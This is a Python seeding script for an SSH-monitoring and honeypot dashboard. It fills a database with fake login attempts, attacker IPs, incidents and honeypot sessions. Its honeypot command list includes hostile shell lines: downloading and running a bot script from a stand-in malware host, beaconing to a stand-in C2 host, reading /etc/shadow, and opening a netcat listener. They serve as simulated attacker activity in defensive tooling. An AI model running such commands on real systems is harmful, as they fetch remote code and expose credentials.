import random
import json
import hashlib
from datetime import datetime, timedelta
from modules.database import db, SSHAttempt, ActiveSession, HoneypotSession, Incident, NotificationConfig, AppSetting

ATTACK_IPS = [
    ("185.220.101.45", "Germany", "DE", "Frankfurt", "Tor Exit Node", 50.1, 8.7),
    ("103.89.92.11", "China", "CN", "Beijing", "ChinaNet", 39.9, 116.4),
    ("91.240.118.222", "Russia", "RU", "Moscow", "LLC Baxet", 55.7, 37.6),
    ("45.142.212.100", "Netherlands", "NL", "Amsterdam", "Serverius", 52.4, 4.9),
    ("194.165.16.77", "Iran", "IR", "Tehran", "Afranet", 35.7, 51.4),
    ("222.186.30.76", "China", "CN", "Jinan", "ChinaNet", 36.7, 117.0),
    ("203.0.113.10", "Germany", "DE", "Berlin", "Hetzner", 52.5, 13.4),
    ("176.119.4.155", "Ukraine", "UA", "Kyiv", "Lanet", 50.4, 30.5),
    ("161.35.210.20", "United States", "US", "New York", "DigitalOcean", 40.7, -74.0),
    ("80.82.77.33", "Netherlands", "NL", "Amsterdam", "SPRINTHOST", 52.4, 4.9),
    ("218.92.0.190", "China", "CN", "Shanghai", "ChinaUnicom", 31.2, 121.5),
    ("36.110.228.254", "China", "CN", "Zhengzhou", "ChinaNet", 34.7, 113.7),
    ("51.178.47.248", "France", "FR", "Paris", "OVH", 48.9, 2.3),
    ("109.248.9.17", "Russia", "RU", "St. Petersburg", "Selectel", 59.9, 30.3),
    ("200.147.35.90", "Brazil", "BR", "São Paulo", "NET Virtua", -23.5, -46.6),
    ("196.192.80.4", "Nigeria", "NG", "Lagos", "MTN", 6.5, 3.4),
    ("41.231.11.23", "Tunisia", "TN", "Tunis", "TOPNET", 36.8, 10.2),
    ("89.248.167.131", "Netherlands", "NL", "Amsterdam", "M247", 52.4, 4.9),
    ("46.101.178.140", "United Kingdom", "GB", "London", "DigitalOcean", 51.5, -0.1),
    ("134.119.197.178", "Germany", "DE", "Nuremberg", "Contabo", 49.4, 11.1),
]

USERNAMES = [
    "root", "admin", "test", "guest", "ubuntu", "pi", "oracle", "postgres",
    "user", "deploy", "ec2-user", "centos", "debian", "git", "mysql", "ftp",
    "backup", "support", "webmaster", "administrator", "tomcat", "www-data",
    "nginx", "apache", "vagrant", "ansible", "jenkins", "docker", "hadoop",
    "elastic", "kibana", "monitor", "nagios", "zabbix", "splunk", "syslog"
]

HONEYPOT_COMMANDS = [
    ["ls", "pwd", "whoami", "cat /etc/passwd"],
    ["uname -a", "id", "ifconfig", "netstat -an"],
    ["wget http://malware.example.com/bot.sh", "chmod +x bot.sh", "./bot.sh"],
    ["cat /etc/shadow", "cat /etc/hosts", "history", "last"],
    ["ps aux", "top -n1", "free -m", "df -h"],
    ["echo 'hacked' > /tmp/pwned", "curl http://c2.example.com/beacon"],
    ["ssh-keygen -t rsa", "cat ~/.ssh/authorized_keys"],
    ["crontab -l", "cat /etc/crontab", "ls /etc/cron.d/"],
    ["find / -perm -4000 2>/dev/null", "sudo -l"],
    ["apt-get install -y netcat", "nc -lvnp 4444 &"],
]

EVENT_TYPES = ["login_attempt", "login_attempt", "login_attempt", "brute_force", "root_login", "port_scan"]


def seed_database(app, count=500):
    """Seed demo data into the database."""
    with app.app_context():
        if SSHAttempt.query.count() > 0:
            return  # Already seeded

        print("[*] Seeding demo data...")
        now = datetime.utcnow()

        # SSH Attempts
        attempts = []
        for i in range(count):
            ip_data = random.choice(ATTACK_IPS)
            ip, country, cc, city, isp, lat, lon = ip_data
            ts = now - timedelta(
                days=random.randint(0, 30),
                hours=random.randint(0, 23),
                minutes=random.randint(0, 59),
                seconds=random.randint(0, 59)
            )
            username = random.choice(USERNAMES)
            status = random.choices(["failed", "success"], weights=[85, 15])[0]
            is_root = username == "root"
            evt_raw = random.choices(EVENT_TYPES, weights=[50, 50, 50, 10, 5, 3])[0]
            if is_root:
                evt = "root_login"
            elif evt_raw == "brute_force":
                evt = "brute_force"
            else:
                evt = f"login_{status}"

            attempt = SSHAttempt(
                timestamp=ts,
                ip=ip,
                username=username,
                status=status,
                event_type=evt,
                country=country,
                country_code=cc,
                region=city,
                city=city,
                isp=isp,
                lat=lat,
                lon=lon,
                is_root=is_root,
                is_brute_force=(evt == "brute_force"),
                port=22
            )
            attempts.append(attempt)

        db.session.bulk_save_objects(attempts)

        # Active Sessions (3–6 fake active sessions)
        for _ in range(random.randint(3, 6)):
            ip_data = random.choice(ATTACK_IPS)
            ip, country, cc, city, isp, lat, lon = ip_data
            start = now - timedelta(minutes=random.randint(5, 120))
            s = ActiveSession(
                ip=ip,
                username=random.choice(USERNAMES[:5]),
                start_time=start,
                country=country,
                country_code=cc,
                is_active=True,
                pid=random.randint(1000, 9999)
            )
            db.session.add(s)

        # Honeypot Sessions
        for i in range(80):
            ip_data = random.choice(ATTACK_IPS)
            ip, country, cc, city, isp, lat, lon = ip_data
            ts = now - timedelta(days=random.randint(0, 14), hours=random.randint(0, 23))
            cmds = random.choice(HONEYPOT_COMMANDS)
            session_id = hashlib.md5(f"{ip}{ts}{i}".encode()).hexdigest()
            h = HoneypotSession(
                session_id=session_id,
                timestamp=ts,
                ip=ip,
                username=random.choice(USERNAMES),
                password=random.choice(["123456", "password", "admin", "root", "123", "test", "letmein", "qwerty"]),
                country=country,
                country_code=cc,
                duration=random.randint(30, 1800),
                commands=json.dumps(cmds),
                commands_count=len(cmds),
                download_attempts=random.randint(0, 3),
                login_success=random.random() > 0.6,
                is_active=False
            )
            db.session.add(h)

        # Incidents
        incident_templates = [
            ("CRITICAL", "brute_force", "{ip} launched a brute-force attack ({count} attempts in 60s)", True),
            ("CRITICAL", "root_login", "Root login attempt from {ip} ({country})", True),
            ("CRITICAL", "suspicious_login", "Suspicious successful login: {username}@{ip} from {country}", True),
            ("WARNING", "multiple_failures", "Multiple failed logins from {ip} — {count} attempts", False),
            ("WARNING", "new_country", "New attacking country detected: {country} ({ip})", False),
            ("INFO", "login_success", "Successful SSH login: {username} from {ip}", False),
            ("INFO", "session_started", "New SSH session started from {ip}", False),
        ]

        for i in range(60):
            tpl = random.choice(incident_templates)
            level, etype, msg_tpl, notify = tpl
            ip_data = random.choice(ATTACK_IPS)
            ip, country, cc, city, isp, lat, lon = ip_data
            username = random.choice(USERNAMES)
            ts = now - timedelta(days=random.randint(0, 7), hours=random.randint(0, 23), minutes=random.randint(0, 59))
            msg = msg_tpl.format(ip=ip, country=country, username=username, count=random.randint(50, 500))
            inc = Incident(
                timestamp=ts,
                level=level,
                event_type=etype,
                message=msg,
                ip=ip,
                username=username,
                country=country,
                resolved=random.random() > 0.6,
                notified=notify
            )
            db.session.add(inc)

        # Default notification configs
        notif_defaults = [
            ("whatsapp", "8281762218", "", True),
            ("telegram", "", "", False),
            ("email", "", "", False),
        ]
        for channel, target, key, enabled in notif_defaults:
            nc = NotificationConfig(
                channel=channel,
                target=target,
                api_key=key,
                enabled=enabled,
                on_failed_login=True,
                on_success_login=True,
                on_root_login=True,
                on_brute_force=True,
                on_new_country=True,
                on_critical=True
            )
            db.session.add(nc)

        # App settings
        settings = [
            ("brute_force_threshold", "10"),
            ("brute_force_window", "60"),
            ("ssh_log_path", "/var/log/auth.log"),
            ("demo_mode", "true"),
            ("refresh_interval", "5000"),
            ("max_feed_rows", "100"),
            ("theme", "dark"),
        ]
        for key, val in settings:
            s = AppSetting(key=key, value=val)
            db.session.add(s)

        db.session.commit()
        print(f"[+] Demo data seeded: {count} SSH attempts, 80 honeypot sessions, 60 incidents")
